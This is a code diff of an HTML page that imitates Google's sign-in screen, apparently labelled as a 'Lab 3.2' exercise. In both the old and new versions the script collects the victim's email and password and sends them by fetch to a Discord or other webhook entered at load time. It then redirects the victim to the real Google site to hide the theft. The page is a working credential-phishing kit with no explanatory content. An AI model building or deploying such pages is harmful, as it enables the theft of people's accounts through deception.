@@ -4,106 +4,99 @@
     <meta charset="UTF-8">
     <title>Sign in - Google Accounts</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { position: relative; width: 450px; height: 500px; background: #fff; border: 1px solid #dadce0; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; align-items: center; padding: 48px 40px 36px; box-sizing: border-box; }
+        :root { --g-blue: #1a73e8; --g-border: #dadce0; --g-text: #202124; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         
-        /* The "Stage" for animations */
-        .stage { position: relative; width: 100%; height: 100%; transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        .card { width: 100%; position: absolute; top: 0; left: 0; transition: opacity 0.2s, transform 0.3s; text-align: center; }
+        /* The Outer Shell */
+        .auth-container { width: 450px; height: 500px; border: 1px solid var(--g-border); border-radius: 8px; position: relative; overflow: hidden; display: flex; flex-direction: column; }
         
-        /* State Handling */
-        .hidden { opacity: 0; pointer-events: none; transform: translateX(100px); }
-        .exit { opacity: 0; pointer-events: none; transform: translateX(-100px); }
-
-        img { width: 75px; margin-bottom: 8px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px; }
-        p { color: #202124; font-size: 16px; margin-bottom: 24px; }
-        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
-        input:focus { outline: none; border: 2px solid #1a73e8; }
+        /* The Sliding Track */
+        .slider-track { display: flex; width: 900px; height: 100%; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
         
-        .user-pill { display: inline-flex; align-items: center; padding: 5px 12px; border: 1px solid #dadce0; border-radius: 16px; font-size: 14px; margin-bottom: 20px; cursor: pointer; }
-        .btn-row { width: 100%; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
-        .link { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        /* Individual Pages */
+        .page { width: 450px; height: 100%; padding: 48px 40px; box-sizing: border-box; flex-shrink: 0; text-align: center; }
+        
+        img.logo { width: 75px; margin-bottom: 8px; }
+        h1 { font-size: 24px; font-weight: 400; color: var(--g-text); margin-bottom: 8px; }
+        p { font-size: 16px; margin-bottom: 24px; color: var(--g-text); }
+        
+        input { width: 100%; padding: 13px 15px; margin-top: 10px; border: 1px solid var(--g-border); border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { outline: none; border: 2px solid var(--g-blue); }
+        
+        .pill { border: 1px solid var(--g-border); border-radius: 16px; padding: 5px 12px; display: inline-flex; align-items: center; font-size: 14px; margin-bottom: 20px; font-weight: 500; }
+        
+        .footer-btns { margin-top: auto; display: flex; justify-content: space-between; align-items: center; padding-top: 40px; }
+        .link { color: var(--g-blue); font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
+        button { background: var(--g-blue); color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; }
+        
+        /* The Slide Action */
+        .slide-to-pass { transform: translateX(-450px); }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    
-    <!-- Step 1: Email -->
-    <div class="card" id="step-email">
-        <h1>Sign in</h1>
-        <p>Use your Google Account</p>
-        <input type="email" id="email" placeholder="Email or phone" autofocus>
-        <div style="text-align: left;"><a href="#" class="link">Forgot email?</a></div>
-        <div class="btn-row">
-            <a href="#" class="link">Create account</a>
-            <button onclick="toPassword()">Next</button>
+<div class="auth-container">
+    <div class="slider-track" id="track">
+        
+        <!-- Page 1: Email -->
+        <div class="page">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+            <input type="email" id="email" placeholder="Email or phone" autofocus>
+            <div style="text-align:left; margin-top:8px;"><a class="link">Forgot email?</a></div>
+            <div class="footer-btns">
+                <a class="link">Create account</a>
+                <button onclick="goNext()">Next</button>
+            </div>
         </div>
-    </div>
 
-    <!-- Step 2: Password -->
-    <div class="card hidden" id="step-password">
-        <h1>Welcome</h1>
-        <div class="user-pill" id="user-display" onclick="reset()"></div>
-        <input type="password" id="pass" placeholder="Enter your password" autofocus>
-        <div style="text-align: left;"><a href="#" class="link">Forgot password?</a></div>
-        <div class="btn-row">
-            <span></span> <!-- Spacer -->
-            <button onclick="transmit()">Next</button>
+        <!-- Page 2: Password -->
+        <div class="page">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+            <h1>Welcome</h1>
+            <div class="pill" id="user-pill"></div>
+            <input type="password" id="pass" placeholder="Enter your password" autofocus>
+            <div style="text-align:left; margin-top:8px;"><a class="link">Forgot password?</a></div>
+            <div class="footer-btns">
+                <span></span>
+                <button onclick="finish()">Next</button>
+            </div>
         </div>
+
     </div>
 </div>
 
 <script>
-    let hook = sessionStorage.getItem('discord_hook');
-    if (!hook) {
-        hook = prompt("Enter Discord Webhook for Lab 3.2:");
-        if (hook) sessionStorage.setItem('discord_hook', hook);
+    const track = document.getElementById('track');
+    const userPill = document.getElementById('user-pill');
+    let webhook = sessionStorage.getItem('lab_hook');
+
+    if (!webhook) {
+        webhook = prompt("Enter Webhook for Lab 3.2:");
+        if (webhook) sessionStorage.setItem('lab_hook', webhook);
     }
 
-    function toPassword() {
-        const email = document.getElementById('email').value;
-        if (!email) return;
-
-        document.getElementById('user-display').innerText = email;
-        
-        // Trigger Animation
-        document.getElementById('step-email').classList.add('exit');
-        setTimeout(() => {
-            document.getElementById('step-password').classList.remove('hidden');
-        }, 150);
+    function goNext() {
+        const mail = document.getElementById('email').value;
+        if(!mail) return;
+        userPill.innerText = mail;
+        track.classList.add('slide-to-pass');
     }
 
-    function reset() {
-        document.getElementById('step-password').classList.add('hidden');
-        document.getElementById('step-email').classList.remove('exit');
-    }
+    async function finish() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
-    async function transmit() {
-        const e = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
+        await fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `**[LAB 3.2] LOG**\nUser: \`${mail}\`\nPass: \`${pass}\``
+            })
+        });
 
-        const payload = {
-            embeds: [{
-                title: "🔑 Animated Credential Harvest",
-                color: 3447003,
-                fields: [
-                    { name: "Email", value: `\`${e}\``, inline: true },
-                    { name: "Pass", value: `|| ${p} ||`, inline: true }
-                ],
-                footer: { text: "Ref: LAB_EXERCISES_60.txt" }
-            }]
-        };
-
-        try {
-            await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        } catch {
-            window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        }
+        window.location.href = "https://accounts.google.com";
     }
 </script>
 </body>
